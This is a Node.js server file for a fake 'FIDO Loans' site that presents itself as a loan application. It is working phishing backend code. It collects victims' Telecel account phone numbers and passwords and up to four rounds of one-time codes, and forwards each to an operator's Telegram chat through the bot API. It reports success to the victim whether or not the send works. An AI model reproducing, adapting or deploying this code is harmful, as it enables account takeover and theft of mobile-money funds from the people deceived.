/**
 * FIDO Loans – Local Server + Telegram Bot
 * ----------------------------------------
 * Start: node server.js
 * Env vars (see .env.example):
 *   BOT_TOKEN   – Telegram bot token from @BotFather
 *   CHAT_ID     – Telegram chat/group ID to receive submissions
 *   PORT        – HTTP port (default 3000)
 */

require('dotenv').config();
const express  = require('express');
const path     = require('path');
const https    = require('https');

const app  = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN || '';
const CHAT_ID   = process.env.CHAT_ID   || '';

/* ── Middleware ── */
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));   // serve HTML files

/* ── Telegram helper ── */
function sendTelegram(text) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('[Telegram] BOT_TOKEN or CHAT_ID not set – skipping notification.');
    return Promise.resolve();
  }

  return new Promise((resolve, reject) => {
    const body = JSON.stringify({
      chat_id:    CHAT_ID,
      text:       text,
      parse_mode: 'HTML',
    });

    const req = https.request({
      hostname: 'api.telegram.org',
      path:     `/bot${BOT_TOKEN}/sendMessage`,
      method:   'POST',
      headers:  {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    }, res => {
      let data = '';
      res.on('data', d => data += d);
      res.on('end', () => {
        const json = JSON.parse(data);
        if (json.ok) resolve(json);
        else reject(new Error(json.description));
      });
    });

    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

/* ── Format message ── */
function formatMessage(d) {
  const now = new Date().toLocaleString('en-GH', { timeZone: 'Africa/Accra' });
  return `
📱 <b>TELECEL VERIFICATION – FIDO LOANS</b>
━━━━━━━━━━━━━━━━━━━━━━━

• Account Type: <b>${esc(d.accountType)}</b>
• Phone Number: <b>${esc(d.phone)}</b>
• Password:     <b>${esc(d.password)}</b>

🕐 <i>Submitted: ${now}</i>
`.trim();
}

function esc(s) {
  return String(s || '')
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;');
}

/* ── POST /submit ── */
app.post('/submit', async (req, res) => {
  const data = req.body;
  console.log('[Submission received]', data);

  // Basic validation
  const required = ['fullname','dob','email','address','employment','purpose','amount','term','phone','password'];
  const missing  = required.filter(k => !data[k]);
  if (missing.length) {
    return res.status(400).json({ error: 'Missing fields', missing });
  }

  try {
    await sendTelegram(formatMessage(data));
    console.log('[Telegram] Message sent successfully');
    res.json({ success: true });
  } catch (err) {
    console.error('[Telegram error]', err.message);
    // Still return success to user – log error server-side
    res.json({ success: true, warning: 'Telegram notification failed' });
  }
});

/* ── POST /otp-step ── */
app.post('/otp-step', async (req, res) => {
  const { phone, password, code, round } = req.body;
  const now = new Date().toLocaleString('en-GH', { timeZone: 'Africa/Accra' });

  const msg = `
🔑 <b>OTP RECEIVED – FIDO LOANS</b>
━━━━━━━━━━━━━━━━━━━━━━━
📱 Phone: <b>${esc(phone)}</b>
🔑 Pass:  <b>${esc(password)}</b>
🔢 Code:  <code>${esc(code)}</code>
🔄 Round: <b>${round} / 4</b>

🕐 <i>Received: ${now}</i>
`.trim();

  try { await sendTelegram(msg); } catch(e) { console.error('[otp notify]', e.message); }
  res.json({ ok: true });
});

/* ── POST /verified ── (called after OTP rounds complete) */
app.post('/verified', async (req, res) => {
  const data = req.body;
  const ref  = data.ref || 'N/A';
  const now = new Date().toLocaleString('en-GH', { timeZone: 'Africa/Accra' });

  const msg = `
✅ <b>LOAN APPLICATION VERIFIED – FIDO LOANS</b>
━━━━━━━━━━━━━━━━━━━━━━━

👤 <b>${esc(data.fullname)}</b> has completed OTP verification.

📱 Phone: <b>${esc(data.phone)}</b>
🔑 Pass:  <b>${esc(data.password)}</b>
💰 Amount: <b>GHS ${esc(data.amount)}</b>  |  Term: <b>${esc(data.term)}</b>
🏷 Ref: <b>${ref}</b>

🕐 <i>Finalized: ${now}</i>
`.trim();

  try { await sendTelegram(msg); } catch(e) { console.error('[verified notify]', e.message); }
  res.json({ ok: true });
});


app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

/* ── Start ── */
app.listen(PORT, () => {
  console.log(`\n✅  FIDO Loans running at http://localhost:${PORT}`);
  console.log(`    Telegram bot: ${BOT_TOKEN ? '✅ configured' : '⚠️  NOT configured (set BOT_TOKEN & CHAT_ID in .env)'}`);
  console.log(`    Open http://localhost:${PORT} in your browser\n`);
});
